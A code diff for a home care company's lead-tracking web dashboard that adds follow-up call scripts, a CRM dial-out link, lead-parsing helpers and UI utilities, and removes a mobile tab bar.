+    opener: 'Hi [Name], this is Aron from Solura Home Care — we spoke [briefly / I\'ve tried reaching you] about home care services. Is now an okay time?',
+    intro: 'I just wanted to follow up and make sure you got the information we discussed, and see if any questions came up.',
+    questions: [
+      'Has anything changed with the care situation since we last spoke?',
+      'Did you have a chance to review what we sent over?',
+      'What\'s most important to you when choosing a care provider?'
+    ],
+    close: 'I\'d love to set up that assessment when you\'re ready — it really helps us give you a clear picture of what care would look like. What day works best this week or next?',
+    objections: 'If they\'re not ready: "Absolutely, no pressure. Would it be alright if I checked back in [timeframe]? I want to make sure you have all the info when the time is right."'
+  }
+};
+
+function openScript(ri) {
+  var r = rows[ri];
+  if (!r) return;
+  var name  = String(r[C.NM] || 'the lead');
+  var log   = String(r[C.SL] || '');
+
+  /* Determine which script to show */
+  var hasFirstCall = log.toLowerCase().indexOf('first call') > -1;
+  var script = hasFirstCall ? SCRIPTS[2] : SCRIPTS[1];
+
+  var html = '<div class="script-box">';
+  html += '<div class="script-phase">' + script.phase + '</div>';
+  html += '<div class="script-section"><div class="script-section-t">Opener</div>';
+  html += '<div class="script-content">' + escHtml(script.opener.replace(/\[Name\]/g, name.split(' ')[0])) + '</div></div>';
+  html += '<div class="script-section"><div class="script-section-t">Introduction</div>';
+  html += '<div class="script-content">' + escHtml(script.intro) + '</div></div>';
+  html += '<div class="script-section"><div class="script-section-t">Discovery Questions</div>';
+  html += '<div class="script-content">' + script.questions.map(function(q,i) { return (i+1) + '. ' + escHtml(q); }).join('\n') + '</div></div>';
+  html += '<div class="script-section"><div class="script-section-t">Close</div>';
+  html += '<div class="script-content">' + escHtml(script.close) + '</div></div>';
+  html += '<div class="script-tip">💡 Objection handling: ' + escHtml(script.objections) + '</div>';
+  html += '</div>';
+
+  el('script-title').textContent = 'Call Script — ' + name.split(' ')[0];
+  el('script-body').innerHTML = html;
+  openModal('script-modal');
+}
+
+/* ────────────────────────────────────────────────────────────────────
+   DIAL via HomeCareGrow
+──────────────────────────────────────────────────────────────────── */
+function dialHCG(phone) {
+  var clean = String(phone).replace(/\D/g,'');
+  var url = 'https://app.homecaregrow.io/v2/location/' + GHL_LOC + '/contacts?search=' + encodeURIComponent('+1' + clean);
+  window.open(url, 'hcg', 'width=1100,height=750,noopener');
+}
+
+/* ────────────────────────────────────────────────────────────────────
+   MOBILE TABS
+──────────────────────────────────────────────────────────────────── */
+function mobTab(t) {
+  document.querySelectorAll('.mob-tab').forEach(function(b) { b.classList.remove('on'); });
+  var btn = el('tab-' + t); if (btn) btn.classList.add('on');
+  var secs = document.querySelectorAll('.section');
+  if (t === 'queue') {
+    secs.forEach(function(s, i) { s.style.display = i < 3 ? '' : 'none'; });
+  } else if (t === 'all') {
+    secs.forEach(function(s, i) { s.style.display = i === 3 ? '' : 'none'; });
+  }
+  window.scrollTo(0, 0);
+}
+
+/* ────────────────────────────────────────────────────────────────────
+   HELPERS
+──────────────────────────────────────────────────────────────────── */
+function getAllLeads() {
+  /* Reconstruct from current rows */
+  var now = new Date(), ts = ds(now), td = new Date(ts), allL = [];
+  for (var i = 3; i < rows.length; i++) {
+    var r = rows[i]; var name = r[C.NM]; if (!name) continue;
+    var st = String(r[C.ST] || '').trim();
+    if (EXCL.some(function(x) { return st.toLowerCase().indexOf(x) > -1; })) continue;
+    allL.push(rowToLead(i));
+  }
+  return allL;
+}
+
+function rowToLead(i) {
+  var r = rows[i];
+  var st = String(r[C.ST] || '').trim();
+  var da = pd(r[C.DA]);
+  var now = new Date(), ts = ds(now), td = new Date(ts);
+  var daysOld = da ? Math.max(0, Math.round((td - new Date(da.getFullYear(), da.getMonth(), da.getDate())) / 86400000)) : 0;
+  var active = isActive(st);
+  var fuRaw = r[C.NF]; var fu = fuRaw ? pd(fuRaw) : null;
+  var afud = (fu && !isNaN(fu)) ? new Date(fu.getFullYear(), fu.getMonth(), fu.getDate()) : null;
+  var lead = {
+    ri:i, no:r[C.NO], name:String(r[C.NM]||''), phone:r[C.PH]||'', email:r[C.EM]||'',
+    area:r[C.AR]||'', source:r[C.SO]||'', services:r[C.SV]||'', hours:r[C.HR]||'',
+    status:st, method:r[C.MT]||'', dm:r[C.DM]||'', payType:r[C.PT]||'',
+    moveIn:r[C.MV]||'', agreed:r[C.AG]||'', notes:r[C.NT]||'',
+    seqLast:r[C.SL]||'', safety:r[C.SAFETY]||'', rel:r[C.REL]||'', nsm:r[C.NSM]||'',
+    daysOld:daysOld, active:active, fu:afud, fuStr:afud?ds(afud):''
+  };
+  lead.na = getNextAction(lead);
+  lead.phaseLabel = getPhaseLabel(lead);
+  return lead;
+}
+
+function gf(url) {
+  return fetch(url, {headers: {Authorization: 'Bearer ' + tok}});
+}
+
+function el(id) { return document.getElementById(id); }
+function setText(id, val) { var e = el(id); if (e) e.textContent = val; }
+function show(id, disp) { var e = el(id); if (e) e.style.display = disp || 'block'; }
+
+function openModal(id) {
+  var m = el(id); if (m) m.classList.add('open');
+}
+function closeModal(id) {
+  var m = el(id); if (m) m.classList.remove('open');
+}
+
+function spin(msg) {
+  var sp = el('spinner'); if (sp) sp.classList.add('on');
+  setText('smsg', msg || 'Loading…');
+}
+function unspin() { var sp = el('spinner'); if (sp) sp.classList.remove('on'); }
+
+function showErr(msg) { var e = el('err'); if (e) { e.textContent = '⚠ ' + msg; e.classList.add('on'); } }
+function clearErr()   { var e = el('err'); if (e) { e.textContent = ''; e.classList.remove('on'); } }
+
+var toastTimer = null;
+function toast(msg) {
+  var t = el('toast'); if (!t) return;
+  t.textContent = msg;
+  t.classList.add('show');
+  if (toastTimer) clearTimeout(toastTimer);
+  toastTimer = setTimeout(function() { t.classList.remove('show'); }, 3000);
+}
+
+function escHtml(s) {
+  return String(s || '')
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;');
+}
+function escAttr(s) { return String(s || '').replace(/'/g,'&#39;').replace(/"/g,'&quot;'); }
+
+/* Service Worker */
+if ('serviceWorker' in navigator) {
+  window.addEventListener('load', function() {
+    navigator.serviceWorker.register('sw.js').catch(function() {});
+  });
 }
 </script>
-
-<nav class="mob-tabs" id="mob-tabs">
-  <button class="mob-tab on" id="tab-queue" onclick="mobTab('queue')">
-    <svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>Queue
-  </button>
-  <button class="mob-tab" id="tab-all" onclick="mobTab('all')">
-    <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>All
-  </button>
-  <button class="mob-tab" id="tab-refresh" onclick="loadData()">
-    <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-4.5"/></svg>Sync
-  </button>
-</nav>
 </body>
 </html>
